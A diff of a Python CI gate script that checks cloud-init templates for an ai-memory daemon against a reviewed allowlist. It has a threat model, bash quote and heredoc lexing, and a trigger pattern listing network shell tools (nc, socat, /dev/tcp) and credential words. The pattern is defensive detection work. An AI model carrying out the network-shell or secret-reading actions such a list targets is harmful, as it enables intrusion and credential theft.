@@ -1,95 +1,137 @@
 #!/usr/bin/env python3
 # Copyright 2026 AlphaOne LLC
 # SPDX-License-Identifier: Apache-2.0
-"""#4616 - cloud-init memory templates must start a daemon that can boot.
+"""#4616/#4657 - cloud-init memory templates: a fail-closed token allowlist.
 
-Two infra templates start ``ai-memory serve`` from a systemd unit rendered by
-cloud-init (``infra/do-hive/cloud-init-memory.yaml.tpl`` and
-``infra/aws-gpu-burst/cloud-init-memory.yaml.tpl``). A flag the binary does not
-define (the old ``--bind``) makes the unit exit at start and loop on
-``Restart=on-failure``; cloud-init discards a config containing a non-ASCII
-byte (#1880). Neither failure shows up at provision time.
+Two templates (``infra/do-hive/cloud-init-memory.yaml.tpl`` and
+``infra/aws-gpu-burst/cloud-init-memory.yaml.tpl``) provision a node and start
+``ai-memory serve``. Rounds 1 and 2 of PR #4655 showed that a denylist of
+forbidden spellings always has one more spelling it does not know (git through
+a variable, curl into tar, a pin read from the network, a drop-in written by
+printf, a case-changed sslmode key). The decision on #4657 (5-agent vote
+(4d3ea1c5), memory 19497ef6) replaces those pattern rules with an allowlist.
 
-The gate scans the files matching ``infra/*/cloud-init-memory*.tpl`` on disk
-(a filesystem glob, not ``git ls-files``). It enforces seven rules; the function
-that proves each is named, and ``--self-test`` carries red and green probes for
-every one:
+Threat model (what this gate claims, and what it does not):
+  The gate stops HONEST DRIFT: an edit that adds or changes a line able to
+  fetch, execute, install, change a permission, name a credential, or reach the
+  daemon's configuration fails here until the exact line is added to the
+  reviewed allowlist ``scripts/qc-allowlists/cloud-init-token-allow.txt``.
+  It does NOT claim to stop an author who both hides a token (a spelling the
+  trigger list does not know) and edits this gate or its allowlist: that author
+  is covered by code review of the allowlist diff, which is small and
+  line-for-line. It does not prove that an allowlisted line is safe; the
+  companion rule and the validators below refuse the shapes known to be unsafe
+  even when someone lists them.
 
-  1. ``scan_text``: no non-ASCII byte (cloud-init discards the config, #1880).
-  2. ``serve_invocations``: some ``ExecStart=`` runs ``ai-memory serve`` (a gate
-     that finds nothing to check must not pass); the parser joins systemd
-     ``\\``-continued lines, accepts a ``/usr/bin/env`` wrapper and global flags
-     before ``serve``, and fails closed on a shell or other launcher that hides
-     the argv.
-  3. ``serve_arg_hits``: every ``--flag`` after ``serve`` is a long flag of
-     ``ServeArgs`` in ``src/daemon_runtime.rs`` (``serve_flags`` parses it; clap
-     derives it from the field name or an explicit ``long = "name"``); a short
-     flag is accepted only if ServeArgs defines it (none does today); partly-interpolated values are refused; only a whole ``${name}``
-     or ``$${name}`` is accepted, and only as a flag value.
-  4. ``scan_text``: ``--tls-cert`` and ``--tls-key`` are both present (a policy
-     choice: the templates supply operator certificate material whose SAN
-     carries the node IP; serve itself would resolve its own certificate with no
-     flags, ``resolve_tls_material``, src/daemon_runtime.rs:6163-6225).
-  5. ``dsn_hits``: every ``postgres://`` URL, wherever it is written, ends with
-     ``sslmode=verify-full`` as its last sslmode (the #3705 floor,
-     src/transit_encryption.rs:436-446), except a template listed in
-     ``DSN_FLOOR_GAPS`` (``main`` fails a listed template that now passes).
-  6. ``store_channel_hits`` and ``exec_store_url_hits``: the store URL reaches
-     the daemon only through ``AI_MEMORY_STORE_URL_FILE`` (#4577): no
-     ``AI_MEMORY_STORE_URL=`` and no ``--store-url`` in any spelling, no store
-     URL on an ``ExecStart``, and no URL with a password inside a systemd unit.
-  7. ``pin_hits`` (with ``fetch_pinned_body_hits`` and ``git_verb``): extension
-     sources are fetched only by the one ``fetch_pinned`` function that ends
-     in a ``rev-parse HEAD = "$3"`` check, every call passes a ``*_COMMIT``
-     variable, and every ``*_COMMIT=`` value is a full 40-hex commit (#4636).
+What runs, in order, for every template matching ``infra/*/cloud-init-memory*.tpl``:
+  * Line model (``parse_template``): the YAML structure is read line by line
+    (top-level keys, write_files entries that each start with ``- path:``,
+    literal ``content: |`` blocks only). A block is a script (``#!`` first
+    line), a systemd unit, or data. Script lines are joined at a trailing
+    backslash (trailing whitespace after it still joins: fail closed), quote
+    state and heredocs are tracked with bash rules, and a full-line ``#``
+    comment is exempt ONLY outside a quote, outside a heredoc body and not
+    after a continuation (the self-test proves each case).
+  * Trigger (``triggered``): a structural line, a unit line and a shebang are
+    always triggered; any other line is triggered when its text, lower-cased
+    and percent-decoded, holds a trigger word, path or metacharacter
+    (``TRIGGER_RE``). Every triggered line must match an entry
+    ``<scope> | <context> | <whitespace-normalised line>`` of the allowlist,
+    where scope is the template directory or ``both``.
+  * Allowlist form (``load_entries``): a malformed, duplicate, non-normalised
+    or unknown-scope entry is a FAULT; an entry that matches nothing is stale
+    (a ``both`` entry must match in both templates); an empty allowlist, a
+    template with zero triggered lines, or fewer than two templates is a FAULT.
+    ``scripts/qc-allowlists/cloud-init-token-pending.txt`` holds lines that are
+    known defects with a tracker (``<scope> #<issue> | ...``); they pass the
+    allowlist but are never validated as approved, and they go stale too.
+  * Companion rule (``companion_hits``), on script blocks, data blocks and
+    bootcmd/runcmd items (YAML flow lists included): refuses ``eval``, a
+    ``$``-expansion or command substitution in command position (also behind
+    sudo/env/exec/runuser/su/nice/timeout/xargs/flock/systemd-run wrappers),
+    ANSI-C or locale quoting, a shell or interpreter fed by a pipe, a
+    here-string, a process substitution or a heredoc, an expanded ``-c``
+    script, ``source`` of a substitution, a decoder (base64 -d, xxd -r,
+    openssl -d) in a statement that runs a shell, and an unparsable statement
+    that holds ``$`` or a backtick. A literal ``-c`` script is checked again.
+  * Validators (``validate_line``), on every approved (non-pending) line: a
+    postgres URL must end with the exact ``sslmode=verify-full`` both raw and
+    as sqlx decodes the query (case-sensitive key, percent-decoded keys and
+    values, last wins); no case-variant sslmode key, no ``password`` or
+    ``passfile`` key, a userinfo password only in /etc/ai-memory/store-url;
+    no ``--store-url`` in any quoting, no ``AI_MEMORY_STORE_URL=``, no
+    ``PGPASSWORD``/``PGPASSFILE``, no ``password=``, no lax-permission
+    opt-out; curl/wget never ``|| true`` or piped into a shell, tar or
+    interpreter; tar -x never ``|| true``; no unit binary under the service
+    user's home; no ``encoding:``/``!!binary``/``source:``/``uri:`` in
+    write_files; the store-url file and any chmod of it stay 0600.
+  * Rendered user-data size (``userdata_hits``): the rendered template (both
+    branches of every ``%{ }`` directive kept, each ``${x}`` replaced by a long
+    stand-in) must fit the provider limit (AWS 16384, DigitalOcean 65536), or
+    the template's main.tf must pass it through ``base64gzip`` and the gzip
+    must fit. A template with no known limit is a FAULT.
+  * Rules kept from the previous gate: 1 no non-ASCII byte (#1880); 2 some
+    ExecStart runs ``ai-memory serve`` (fail closed on a launcher that hides
+    the argv); 3 every serve argument is a ServeArgs flag of
+    src/daemon_runtime.rs or a whole ``${name}`` value; 4 ``--tls-cert`` and
+    ``--tls-key`` are both present (template policy).
 
 Usage (any other argument exits 2):
-  scripts/check-cloud-init-serve-flags.py             exit 0 clean, 1 on a
-                                                      hit, 2 on a scanner fault
-  scripts/check-cloud-init-serve-flags.py --self-test prove the rule is red on
-                                                      probes, green on clean
-                                                      lines
+  scripts/check-cloud-init-serve-flags.py                 exit 0 clean, 1 on a
+                                                          hit, 2 on a FAULT
+  scripts/check-cloud-init-serve-flags.py --self-test     red and green probes
+  scripts/check-cloud-init-serve-flags.py --list-triggers print every triggered
+                                                          line as an entry
 """
 from __future__ import annotations
 
 import argparse
 import contextlib
+import gzip
+import hashlib
 import io
+import json
 import posixpath
 import re
+import shlex
 import sys
+import urllib.parse
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parent.parent
 SERVE_SRC = ROOT / "src" / "daemon_runtime.rs"
 TEMPLATE_GLOB = "infra/*/cloud-init-memory*.tpl"
+ALLOW_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-allow.txt"
+PENDING_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-pending.txt"
 AWS_TEMPLATE = "infra/aws-gpu-burst/cloud-init-memory.yaml.tpl"
+DO_TEMPLATE = "infra/do-hive/cloud-init-memory.yaml.tpl"
 REQUIRED_FLAGS = ("--tls-cert", "--tls-key")
+SCOPES = ("aws-gpu-burst", "do-hive", "both")
+STORE_URL_PATH = "/etc/ai-memory/store-url"
+# Provider user-data limits in bytes: EC2 16 KB (raw or the decoded base64),
+# DigitalOcean 64 KiB.
+USER_DATA_LIMITS = {"aws-gpu-burst": 16384, "do-hive": 65536}
 
-# Templates that still lack the sslmode floor, each with its tracker. The
-# do-hive store URL dials PgBouncer on 127.0.0.1:6432 and its TLS shape has
-# more than one viable form (#4635 do-hive leg, awaiting a vote). The list may
-# only shrink: a listed template that passes the floor is itself a failure.
-DSN_FLOOR_GAPS = {
-    "infra/do-hive/cloud-init-memory.yaml.tpl": "#4635 do-hive pgbouncer leg",
-}
-# Any `<NAME>_COMMIT=<value>` assignment; every one must be a full 40-hex commit.
-COMMIT_RE = re.compile(r"(?<![\w$])(\w+_COMMIT)=(\S*)")
-HEX40_RE = re.compile(r"^[0-9a-f]{40}$")
-# A shell command `git ...` (not `.git` in a URL, not the word in a package list).
-GIT_CMD_RE = re.compile(r"(?<![\w./$-])git[ \t]+(?P<args>[^;&|\n)]*)")
-GIT_OPT_WITH_ARG = ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env")
-FETCH_PINNED_DEF_RE = re.compile(r"^[ \t]*fetch_pinned\(\)[ \t]*\{[^\n]*\n(?P<body>.*?)\n[ \t]*\}[ \t]*$", re.M | re.S)
-FETCH_PINNED_CALL_RE = re.compile(r'^[ \t]*fetch_pinned[ \t]+https://\S+[ \t]+\S+[ \t]+"\$(?P<var>\w+_COMMIT)"[ \t]*$')
-VERIFY_RE = re.compile(r'^\[ "\$\(git(?: -C "\$2")? rev-parse HEAD\)" = "\$3" \]$')
-COMMENT_LINE_RE = re.compile(r"^[ \t]*#.*$", re.M)
-# A postgres URL anywhere (file line, Environment=, an argv, a heredoc), but not
-# a regex that merely begins with the scheme (s#^postgres://...#): the scheme
-# must start the text or follow whitespace, = " ' ( ` > , or {.
-DSN_RE = re.compile(r"(?<![^\s=\"'(`>,{])postgres(?:ql)?://[^\s\"']+")
-STORE_ENV_RE = re.compile(r"(?<!\w)AI_MEMORY_STORE_URL=")
-UNIT_ENTRY_RE = re.compile(r"^[ \t]*-[ \t]+path:[ \t]*(\S+)[ \t]*$", re.M)
-USERINFO_PW_RE = re.compile(r"[A-Za-z][\w+.-]*://[^/@\s:\"']+:[^/@\s\"']+@")
+# ---------------------------------------------------------------- triggers
+TRIGGER_WORDS = (
+    "git curl wget fetch_pinned tar unzip rsync scp sftp ftp nc ncat socat pip pip3 npm npx docker podman snap "
+    "apt apt-get apt-key dpkg perl ruby node alias eval exec source chmod chown chgrp umask install useradd "
+    "usermod groupadd runuser sudo su ln mv cp rm mkdir setfacl findmnt swapon openssl sha256sum gpg trap "
+    "systemctl systemd-run bash sh dash zsh ksh base64 xxd tee dd crontab psql pg_dump pg_isready createuser "
+    "sed awk mount sysctl iptables ufw ssh visudo passwd chpasswd sslmode sslrootcert password dsn dbname "
+    "conninfo serve export declare readonly local read printf mapfile function env set unset shopt ifs"
+).split()
+TRIGGER_RE = re.compile(
+    r"(?<![\w-])(?:" + "|".join(re.escape(w) for w in TRIGGER_WORDS) + r"|python[\d.]*)(?![\w-])"
+    r"|(?:^|[;&|(]\s*)\.\s|[\w:.-]\s*\(\s*\)"
+    r"|://|/dev/tcp|/dev/udp|_commit|exec|environment|\.service|\[unit\]|\[service\]|\[install\]"
+    r"|ld_preload|store[-_ ]?url|postgres|ai_memory_|api[-_]?key|tls|ssl|hba|shared_preload|allow_lax"
+    r"|ai-memory|aimemory|pgpass|secret|token|key"
+    r"|\$\(|`|\$\{|%\{|\$|>|<"
+    r"|(?:^|[\s=\"'(:>])/(?:etc|opt|usr|run|var|root|home|lib|lib64|bin|sbin|dev|proc|sys|tmp|srv|mnt|boot)\b"
+)
+
+# ---------------------------------------------------------------- rules 1-4
 STRUCT_RE = re.compile(r"pub struct ServeArgs \{(.*?)\n\}", re.S)
 FIELD_RE = re.compile(r"^\s{4}pub (\w+):", re.M)
 ATTR_RE = re.compile(r"#\[arg\((.*?)\)\]", re.S)
@@ -97,14 +139,21 @@ LONG_NAMED_RE = re.compile(r'\blong\s*=\s*"([^"]+)"')
 LONG_BARE_RE = re.compile(r"(?<![\w=])long\s*(?:,|$)")
 SHORT_NAMED_RE = re.compile(r"\bshort\s*=\s*'(.)'")
 SHORT_BARE_RE = re.compile(r"(?<![\w=])short\s*(?:,|$)")
-STORE_FLAG_RE = re.compile(r"(?<![\w-])--store[-_]url\b")
-STORE_SCHEME_RE = re.compile(r"(?i)\b(?:postgres(?:ql)?|sqlite)://")
+ALIAS_RE = re.compile(r'\b(?:visible_)?alias(?:es)?\s*=\s*"([^"]+)"')
 ENV_WRAPPER_ARG_RE = re.compile(r"^(?:-i|--ignore-environment|\w+=\S*)$")
 INTERP_RE = re.compile(r"\$?\$\{[A-Za-z_]\w*\}")
-ALIAS_RE = re.compile(r'\b(?:visible_)?alias(?:es)?\s*=\s*"([^"]+)"')
 EXEC_RE = re.compile(r"^[ \t]*ExecStart=(?P<cmd>.*)$", re.M)
 CONT_RE = re.compile(r"\\[ \t]*\n[ \t]*")
-FLAG_RE = re.compile(r"^(--[A-Za-z][\w-]*)")
+COMMENT_LINE_RE = re.compile(r"^[ \t]*#.*$", re.M)
+DIRECTIVE_LINE_RE = re.compile(r"^[ \t]*%\{[^}]*\}[ \t]*$", re.M)
+
+# ---------------------------------------------------------------- validators
+# A postgres URL anywhere, but not a regex that merely begins with the scheme
+# (s#^postgres://...#): the scheme starts the text or follows whitespace,
+# = " ' ( ` > , or {.
+DSN_RE = re.compile(r"(?<![^\s=\"'(`>,{])postgres(?:ql)?://[^\s\"']+")
+UNIT_SUFFIXES = (".service", ".socket", ".timer", ".mount", ".path", ".target", ".slice", ".scope")
+HEREDOC_RE = re.compile(r"<<(-?)[ \t]*(?:(['\"])([A-Za-z_]\w*)\2|\\?([A-Za-z_]\w*))")
 
 
 def serve_flags(source: str) -> set:
@@ -138,38 +187,36 @@ def serve_flags(source: str) -> set:
 
 def strip_terraform(text: str) -> str:
     """Drop terraform ``%{ if }`` / ``%{ endif }`` directives so their words are
-    not read as flags. Interpolations (``${x}``, ``$${x}``) stay: they are
-    checked where they sit, because systemd expands them in ExecStart."""
+    not read as flags. Interpolations stay: they are checked where they sit."""
     return re.sub(r"%\{[^}]*\}", " ", text)
 
 
-def argv_views(text: str) -> list:
-    """The same text as systemd joins it (backslash-newline becomes a space), as
-    a shell joins it (backslash-newline vanishes) and unjoined, comments blanked.
-    A forbidden spelling must not hide in any of them."""
-    t = blank_comments(text)
-    return [t, CONT_RE.sub(" ", t), re.sub(r"\\\n", "", t)]
+def blank_comments(text: str) -> str:
+    """Blank whole-line comments (keeping the newline)."""
+    return COMMENT_LINE_RE.sub("", text)
 
 
-def exec_store_url_hits(name: str, text: str) -> list:
-    """#4662: no ExecStart may carry a store URL, in any spelling (``--store-url``
-    long form, ``=`` form, a value of another flag, a ${VAR}, a continuation split,
-    a global flag before serve): the DSN reaches the daemon only through
-    AI_MEMORY_STORE_URL_FILE (#4577), never on a world-readable argv."""
-    hits = []
-    for view in argv_views(text):
-        for m in EXEC_RE.finditer(view):
-            cmd = strip_terraform(m.group("cmd"))
-            if STORE_FLAG_RE.search(cmd) or STORE_SCHEME_RE.search(cmd):
-                msg = "%s: ExecStart carries a store URL (--store-url or a postgres:// value); use AI_MEMORY_STORE_URL_FILE (#4577, #4662)" % name
-                if msg not in hits:
-                    hits.append(msg)
-    return hits
+def join_continuations(text: str):
+    """Collapse backslash-newline continuations; return (joined, line_at)."""
+    parts, cuts, last, out_len = [], [], 0, 0
+    for m in CONT_RE.finditer(text):
+        seg = text[last:m.start()]
+        parts.append(seg)
+        out_len += len(seg) + 1
+        parts.append(" ")
+        cuts.append(out_len)
+        last = m.end()
+    parts.append(text[last:])
+    joined = "".join(parts)
+
+    def line_at(off: int) -> int:
+        return joined.count("\n", 0, off) + 1 + sum(1 for c in cuts if c <= off)
+
+    return joined, line_at
 
 
 def prefix_is_env_wrapper(pre: list) -> bool:
-    """Tokens before the ai-memory binary may only be an ``env`` wrapper with
-    options/assignments; a shell, runuser or any other launcher is not parsed."""
+    """Tokens before the ai-memory binary may only be an ``env`` wrapper."""
     if not pre:
         return True
     if posixpath.basename(pre[0].lstrip("-@+!:")) != "env":
@@ -178,9 +225,7 @@ def prefix_is_env_wrapper(pre: list) -> bool:
 
 
 def serve_arg_hits(name: str, lineno: int, after: list, known: set) -> list:
-    """Check every token after ``serve``: flags must be ServeArgs flags (long or
-    short), a value must directly follow its flag, and an expansion may only be
-    a whole ``${name}`` / ``$${name}`` inside a value (serve flags are literal)."""
+    """Rule 3: every token after ``serve`` is a ServeArgs flag or its value."""
     hits = []
     expect_value = False
     for raw in after:
@@ -201,11 +246,7 @@ def serve_arg_hits(name: str, lineno: int, after: list, known: set) -> list:
 
 
 def serve_invocations(text: str) -> list:
-    """Return (line, tokens-after-serve, unparsed) for every ExecStart that runs serve.
-
-    ``unparsed`` is True when the line holds a ``serve`` token but the
-    ai-memory binary could not be identified (fail closed, never skip).
-    """
+    """Rule 2: (line, tokens-after-serve, unparsed) for every ExecStart that runs serve."""
     joined, line_at = join_continuations(blank_comments(text))
     found = []
     for m in EXEC_RE.finditer(joined):
@@ -222,179 +263,17 @@ def serve_invocations(text: str) -> list:
     return found
 
 
-def dsn_hits(name: str, text: str) -> list:
-    """Every postgres:// URL in the template, wherever it is written, ends with
-    sslmode=verify-full as its last sslmode (the #3705 floor); #4659."""
-    hits = []
-    dsns = set()
-    for view in argv_views(text):
-        dsns.update(DSN_RE.findall(view))
-    if not dsns:
-        hits.append("%s: no postgres:// store URL found (cannot check the sslmode floor)" % name)
-    floor_ok = True
-    for dsn in sorted(dsns):
-        query = dsn.split("?", 1)[1] if "?" in dsn else ""
-        modes = [p.split("=", 1)[1].strip().lower() for p in query.split("&") if p.lower().startswith("sslmode=")]
-        if not modes or modes[-1] != "verify-full":
-            floor_ok = False
-            if name in DSN_FLOOR_GAPS:
-                continue
-            hits.append("%s: store URL %s has no sslmode=verify-full (serve refuses it at start, #3705 floor, src/transit_encryption.rs:436-446)" % (name, dsn.split("@")[-1][:60]))
-    if name in DSN_FLOOR_GAPS and floor_ok and dsns:
-        hits.append("%s: store URL now passes the sslmode floor; remove it from DSN_FLOOR_GAPS" % name)
-    return hits
-
-
-def store_channel_hits(name: str, text: str) -> list:
-    """#4659/#4664: the store URL reaches the daemon only through
-    AI_MEMORY_STORE_URL_FILE. AI_MEMORY_STORE_URL= (in a unit Environment=, an
-    export, anywhere) and --store-url are refused in any spelling, and a systemd
-    unit written to the node (0644, readable by every local user through
-    ``systemctl show``) may not hold a URL with a password at all."""
-    hits = []
-    for view in argv_views(text):
-        for rx, what in ((STORE_ENV_RE, "AI_MEMORY_STORE_URL= (a store URL in the environment)"), (STORE_FLAG_RE, "--store-url")):
-            if rx.search(view):
-                msg = "%s: %s is not allowed; use AI_MEMORY_STORE_URL_FILE (#4577, #4659, #4664)" % (name, what)
-                if msg not in hits:
-                    hits.append(msg)
-    blanked = CONT_RE.sub(" ", blank_comments(text))
-    entries = list(UNIT_ENTRY_RE.finditer(blanked))
-    for i, em in enumerate(entries):
-        path = em.group(1)
-        if not (path.endswith(".service") or "/systemd/" in path):
-            continue
-        end = entries[i + 1].start() if i + 1 < len(entries) else len(blanked)
-        if USERINFO_PW_RE.search(blanked[em.end():end]):
-            hits.append("%s: unit %s carries a URL with a password (the unit is 0644; use AI_MEMORY_STORE_URL_FILE, #4664)" % (name, path))
-    return hits
-
-
-def blank_comments(text: str) -> str:
-    """Blank whole-line comments (keeping the newline). Done before continuation
-    joining: a comment line ending in a backslash does not continue."""
-    return COMMENT_LINE_RE.sub("", text)
-
-
-def join_continuations(text: str):
-    """Collapse backslash-newline continuations; return (joined, line_at) where
-    line_at maps a joined offset back to its line number in ``text``."""
-    parts, cuts, last, out_len = [], [], 0, 0
-    for m in CONT_RE.finditer(text):
-        seg = text[last:m.start()]
-        parts.append(seg)
-        out_len += len(seg) + 1
-        parts.append(" ")
-        cuts.append(out_len)
-        last = m.end()
-    parts.append(text[last:])
-    joined = "".join(parts)
-
-    def line_at(off: int) -> int:
-        return joined.count("\n", 0, off) + 1 + sum(1 for c in cuts if c <= off)
-
-    return joined, line_at
-
-
-def git_verb(args: str):
-    """Return (verb, rest) of a ``git <global options> <verb> ...`` argument string."""
-    toks = args.split()
-    i = 0
-    while i < len(toks) and toks[i].startswith("-"):
-        i += 2 if toks[i] in GIT_OPT_WITH_ARG else 1
-    if i >= len(toks):
-        return "", []
-    return toks[i], toks[i + 1:]
-
-
-def fetch_pinned_body_hits(name: str, line: int, body: str) -> list:
-    """The one function allowed to run git must fetch the pin, check out what it
-    fetched, and fail unless HEAD is exactly the pin."""
-    hits = []
-    chain, sep, handler = body.partition("||")
-    segs = [x.strip() for x in chain.split("&&")]
-    seen = set()
-    for i, seg in enumerate(segs):
-        gm = GIT_CMD_RE.match(seg)
-        if seg == 'rm -rf "$2"':
-            continue
-        if VERIFY_RE.match(seg):
-            seen.add("verify")
-            if i != len(segs) - 1:
-                hits.append("%s:%d: fetch_pinned: the rev-parse check must be the last step of the chain" % (name, line))
-            continue
-        if gm is None:
-            hits.append("%s:%d: fetch_pinned: unrecognised step %r" % (name, line, seg[:60]))
-            continue
-        verb, rest = git_verb(gm.group("args"))
-        if verb == "init":
-            continue
-        if verb == "remote" and rest[:1] == ["add"]:
-            continue
-        if verb == "fetch" and rest and rest[-1] == '"$3"':
-            seen.add("fetch")
-            continue
-        if verb == "checkout" and rest and rest[-1] == "FETCH_HEAD":
-            seen.add("checkout")
-            continue
-        hits.append("%s:%d: fetch_pinned: git %s is not a pinned step (fetch the commit as \"$3\", check out FETCH_HEAD)" % (name, line, verb or "?"))
-    for need, why in (("fetch", 'git fetch ... "$3"'), ("checkout", "git checkout ... FETCH_HEAD"), ("verify", '[ "$(git -C "$2" rev-parse HEAD)" = "$3" ]')):
-        if need not in seen:
-            hits.append("%s:%d: fetch_pinned has no %s step (%s, #4636)" % (name, line, need, why))
-    if not sep or not re.search(r"\breturn[ \t]+1\b", handler):
-        hits.append("%s:%d: fetch_pinned has no failure handler that returns 1 (a pin mismatch must stop the script)" % (name, line))
-    return hits
-
-
-def pin_hits(name: str, text: str) -> list:
-    """#4636/#4657: every git use is the one verified fetch_pinned, called with a
-    40-hex commit variable assigned only 40-hex values."""
-    hits = []
-    joined, line_at = join_continuations(blank_comments(text))
-    commits = set()
-    for m in COMMIT_RE.finditer(joined):
-        if HEX40_RE.match(m.group(2)):
-            commits.add(m.group(1))
-        else:
-            hits.append("%s:%d: %s is not a full 40-hex commit" % (name, line_at(m.start()), m.group(1)))
-    defs = list(FETCH_PINNED_DEF_RE.finditer(joined))
-    spans = [(d.start("body"), d.end("body")) for d in defs]
-    gits = list(GIT_CMD_RE.finditer(joined))
-    for m in gits:
-        if not any(a <= m.start() < b for a, b in spans):
-            hits.append("%s:%d: git %s outside fetch_pinned (every git fetch/checkout goes through fetch_pinned with a *_COMMIT 40-hex pin, #4636)" % (name, line_at(m.start()), m.group("args").strip()[:40]))
-    ndefs = joined.count("fetch_pinned()")
-    call_lines = [m for m in re.finditer(r"^.*fetch_pinned.*$", joined, re.M) if "fetch_pinned()" not in m.group(0)]
-    if gits or call_lines or ndefs:
-        if ndefs != 1 or len(defs) != 1:
-            hits.append("%s: expected exactly one multi-line fetch_pinned() definition, found %d (%d parsed)" % (name, ndefs, len(defs)))
-        for d in defs:
-            hits.extend(fetch_pinned_body_hits(name, line_at(d.start("body")), d.group("body")))
-    for m in call_lines:
-        cm = FETCH_PINNED_CALL_RE.match(m.group(0))
-        if cm is None:
-            hits.append("%s:%d: fetch_pinned call must be exactly: fetch_pinned https://<url> <dir> \"$<NAME>_COMMIT\" (got %r)" % (name, line_at(m.start()), m.group(0).strip()[:60]))
-        elif cm.group("var") not in commits:
-            hits.append("%s:%d: fetch_pinned uses $%s, which is not assigned a 40-hex commit in this template" % (name, line_at(m.start()), cm.group("var")))
-    return hits
-
-
-def scan_text(name: str, text: str, known: set) -> list:
-    """Return one message per defect found in a template's text."""
+def rules_1_to_4(name: str, text: str, known: set) -> list:
     hits = []
     for lineno, line in enumerate(text.splitlines(), 1):
         if any(ord(ch) > 127 for ch in line):
             hits.append("%s:%d: non-ASCII byte (cloud-init discards the config, #1880)" % (name, lineno))
-    hits.extend(dsn_hits(name, text))
-    hits.extend(store_channel_hits(name, text))
-    hits.extend(pin_hits(name, text))
-    hits.extend(exec_store_url_hits(name, text))
     invocations = serve_invocations(text)
     if not invocations:
         hits.append("%s: no ExecStart runs 'ai-memory serve' (nothing to check; a template that cannot start serve must not pass)" % name)
     for lineno, after, unparsed in invocations:
         if unparsed:
-            hits.append("%s:%d: ExecStart names serve but is not 'ai-memory serve' or an env wrapper of it (a shell or other launcher hides the argv; cannot check its flags)" % (name, lineno))
+            hits.append("%s:%d: ExecStart names serve but is not 'ai-memory serve' or an env wrapper of it (a launcher hides the argv)" % (name, lineno))
             continue
         hits.extend(serve_arg_hits(name, lineno, after, known))
         flags = [t.strip("\"'").split("=", 1)[0] for t in after if t.strip("\"'").startswith("-")]
@@ -404,123 +283,1540 @@ def scan_text(name: str, text: str, known: set) -> list:
     return hits
 
 
+# ---------------------------------------------------------------- bash lexing
+def norm(text: str) -> str:
+    return " ".join(text.split())
+
+
+def _walk(s: str, state):
+    """Walk ``s`` with bash quoting rules starting in ``state`` (None or a
+    tuple stack of "'", '"', "(" for $( ) and "`"). Yield (index, unquoted)
+    for every character and return the end state through StopIteration."""
+    stack = list(state or ())
+    i, n = 0, len(s)
+    while i < n:
+        c = s[i]
+        top = stack[-1] if stack else None
+        if top == "'":
+            if c == "'":
+                stack.pop()
+            yield i, False
+            i += 1
+            continue
+        if top in ('"', "`"):
+            if c == "\\":
+                yield i, False
+                i += 2
+                continue
+            if c == top:
+                stack.pop()
+            elif top == '"' and c == "$" and s[i + 1:i + 2] == "(":
+                stack.append("(")
+                yield i, False
+                i += 2
+                continue
+            elif top == '"' and c == "`":
+                stack.append("`")
+            yield i, False
+            i += 1
+            continue
+        if c == "\\":
+            yield i, False
+            i += 2
+            continue
+        if c in "'\"`":
+            stack.append(c)
+            yield i, False
+            i += 1
+            continue
+        if c == "$" and s[i + 1:i + 2] == "(":
+            stack.append("(")
+            yield i, False
+            i += 2
+            continue
+        if c == "(" and top == "(":
+            stack.append("(")
+        elif c == ")" and top == "(":
+            stack.pop()
+            yield i, False
+            i += 1
+            continue
+        if c == "#" and (i == 0 or s[i - 1] in " \t;&|()"):
+            break
+        yield i, top is None
+        i += 1
+    return tuple(stack) or None
+
+
+def scan_quotes(s: str, state):
+    """Bash quote state after ``s`` starting in ``state`` (None when every
+    quote, backtick and $( ) is closed). An unquoted ``#`` at the start of a
+    word ends the scan (a comment)."""
+    w = _walk(s, state)
+    try:
+        while True:
+            next(w)
+    except StopIteration as stop:
+        return stop.value
+
+
+def unquoted_mask(s: str, state):
+    """Return (mask, end_state): mask[i] is True where s[i] is top-level code."""
+    mask = [False] * len(s)
+    w = _walk(s, state)
+    try:
+        while True:
+            i, unq = next(w)
+            mask[i] = unq
+    except StopIteration as stop:
+        return mask, stop.value
+
+
+def heredoc_starts(s: str, state) -> list:
+    """Heredoc operators outside quotes: list of (delimiter, strip_tabs, quoted)
+    or the string "bad" for an operator whose delimiter cannot be read."""
+    mask, _ = unquoted_mask(s, state)
+    out = []
+    i = 0
+    while i < len(s) - 1:
+        if mask[i] and s[i] == "<" and s[i + 1] == "<" and (i == 0 or s[i - 1] != "<"):
+            if s[i + 2:i + 3] == "<":
+                i += 3
+                continue
+            m = HEREDOC_RE.match(s, i)
+            if m is None:
+                out.append("bad")
+                i += 2
+                continue
+            delim = m.group(3) or m.group(4)
+            quoted = bool(m.group(2)) or s[m.start():m.end()].find("\\") >= 0
+            out.append((delim, m.group(1) == "-", quoted))
+            i = m.end()
+            continue
+        i += 1
+    return out
+
+
+def bq_end(s: str, i: int) -> int:
+    n = len(s)
+    while i < n:
+        if s[i] == "\\":
+            i += 2
+            continue
+        if s[i] == "`":
+            return i
+        i += 1
+    return -1
+
+
+def dq_end(s: str, i: int) -> int:
+    n = len(s)
+    while i < n:
+        c = s[i]
+        if c == "\\":
+            i += 2
+            continue
+        if c == '"':
+            return i
+        if c == "$" and s[i + 1:i + 2] == "(":
+            j = find_close(s, i + 2)
+            if j < 0:
+                return -1
+            i = j + 1
+            continue
+        if c == "`":
+            j = bq_end(s, i + 1)
+            if j < 0:
+                return -1
+            i = j + 1
+            continue
+        i += 1
+    return -1
+
+
+def find_close(s: str, i: int) -> int:
+    """Index of the ``)`` closing a ``(`` whose content starts at ``i``."""
+    depth, n = 1, len(s)
+    while i < n:
+        c = s[i]
+        if c == "\\":
+            i += 2
+            continue
+        if c == "'":
+            j = s.find("'", i + 1)
+            if j < 0:
+                return -1
+            i = j + 1
+            continue
+        if c == '"':
+            j = dq_end(s, i + 1)
+            if j < 0:
+                return -1
+            i = j + 1
+            continue
+        if c == "`":
+            j = bq_end(s, i + 1)
+            if j < 0:
+                return -1
+            i = j + 1
+            continue
+        if c == "(":
+            depth += 1
+        elif c == ")":
+            depth -= 1
+            if depth == 0:
+                return i
+        i += 1
+    return -1
+
+
+def brace_end(s: str, i: int) -> int:
+    depth, n = 1, len(s)
+    while i < n:
+        c = s[i]
+        if c == "\\":
+            i += 2
+            continue
+        if c == "{":
+            depth += 1
+        elif c == "}":
+            depth -= 1
+            if depth == 0:
+                return i
+        i += 1
+    return -1
+
+
